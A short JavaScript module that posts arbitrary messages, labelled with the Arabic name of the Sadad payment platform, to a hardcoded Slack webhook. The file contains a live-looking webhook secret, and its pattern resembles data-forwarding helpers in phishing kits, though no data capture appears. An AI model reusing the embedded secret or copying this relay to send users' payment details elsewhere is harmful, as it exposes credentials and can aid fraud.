import axios from 'axios';

export const TeleSned = () => {
    const Send = async (message) => {
        const webhookUrl = 'https://hooks.slack.com/services/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';
        const data = `منصة سداد \n ${message}`
        axios.post(webhookUrl,JSON.stringify(data),{
           withCredentials:false,
           transformRequest:[
               (data,headers) =>{
                   return data
               }
           ]
        });
    };

    return { Send };
};

export default TeleSned;
